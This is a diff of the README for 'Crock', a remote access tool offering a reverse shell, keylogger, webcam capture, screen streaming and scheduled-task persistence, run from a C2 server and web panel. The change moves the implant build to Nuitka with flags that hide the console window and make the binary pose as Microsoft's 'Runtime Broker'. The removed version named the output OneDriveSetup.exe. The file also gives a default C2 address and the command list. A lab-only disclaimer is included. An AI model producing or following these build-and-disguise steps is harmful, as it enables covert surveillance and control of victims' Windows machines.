@@ -1,6 +1,6 @@
 # Crock
 Remote access tool with web control panel.  
-Supports reverse shell, screenshots, webcam, process list, keylogger, screen stream and persistence.
+Python implant compiled with Nuitka.
 
 ## Features
 - Reverse shell
@@ -14,33 +14,50 @@ Supports reverse shell, screenshots, webcam, process list, keylogger, screen str
 - Web control panel
 
 ## Requirements
-- Linux (Kali / Ubuntu / Debian) — server
+- Linux (Kali / Ubuntu / Debian) — build + server
 - Windows 10/11 — target
 - Python 3.10+
-- mingw-w64
+- Nuitka
 
 ## Install dependencies
 ```bash
 sudo apt update
-sudo apt install -y python3 python3-pip python3-venv g++-mingw-w64-x86-64
+sudo apt install -y python3 python3-pip python3-venv
 python3 -m venv venv
 source venv/bin/activate
-pip install flask
+pip install flask mss pillow opencv-python psutil pynput nuitka ordered-set zstandard
 ```
 
-## Setup
-1. Activate the environment:
+## Files
+- `implant.py` — implant source
+- `server.py` — C2 listener + web server
+- `dashboard.html` — web panel (must be next to `server.py`)
+- `icon.ico` — icon for the build (optional)
+
+## Build implant
+Edit `HOST` in `implant.py` if needed (default `192.168.122.1`).
+
 ```bash
 source venv/bin/activate
+nuitka \
+  --standalone \
+  --onefile \
+  --windows-disable-console \
+  --windows-company-name="Microsoft Corporation" \
+  --windows-product-name="Runtime Broker" \
+  --windows-file-description="Runtime Broker" \
+  --windows-file-version=10.0.19041.1 \
+  --windows-product-version=10.0.19041.1 \
+  --windows-icon-from-ico=icon.ico \
+  --enable-plugin=anti-bloat \
+  --assume-yes-for-downloads \
+  --remove-output \
+  implant.py
 ```
-2. Edit `HOST` in `implant.cpp` if needed (default `192.168.122.1`).
-3. Build the implant:
-```bash
-x86_64-w64-mingw32-g++ implant.cpp -o OneDriveSetup.exe -static -s -O2 -mwindows -lws2_32 -lgdi32 -luser32 -lshell32 -ladvapi32 -lvfw32
-```
-4. Make sure `dashboard.html` is in the same folder as `server.py`.
 
-## Run
+Output: `implant.exe` (rename to anything).
+
+## Run server
 ```bash
 source venv/bin/activate
 python3 server.py
@@ -50,29 +67,29 @@ python3 server.py
 
 ## Usage
 1. Start `server.py`.
-2. Run `OneDriveSetup.exe` on the Windows machine.
+2. Run the compiled exe on the Windows machine.
 3. Open `http://127.0.0.1:5000`.
 4. Select the client and use the panel.
 
 ## Commands
-- Command,Action
-- info,Client information
-- screenshot,Take screenshot
-- webcam,Webcam photo
-- proclist,List processes
-- keylog_start,Start keylogger
-- keylog_dump,Dump keylogger buffer
-- keylog_stop,Stop keylogger
-- keylog_clear,Clear keylogger buffer
-- stream_start,Start screen stream
-- stream_stop,Stop screen stream
-- persist,Add scheduled task
-- sh:<cmd>,Execute shell command
+Command,Action
+info,Client information
+screenshot,Take screenshot
+webcam,Webcam photo
+proclist,List processes
+keylog_start,Start keylogger
+keylog_dump,Dump keylogger buffer
+keylog_stop,Stop keylogger
+keylog_clear,Clear keylogger buffer
+stream_start,Start screen stream
+stream_stop,Stop screen stream
+persist,Add scheduled task
+sh:<cmd>,Execute shell command
 
 ## Notes
 - Web UI listens only on localhost.
 - Default C2 address is `192.168.122.1:4444`.
-- Persistence uses a scheduled task (highest if elevated).
+- Persistence uses a scheduled task.
 - Lab / authorized use only.
 
 ## Disclaimer
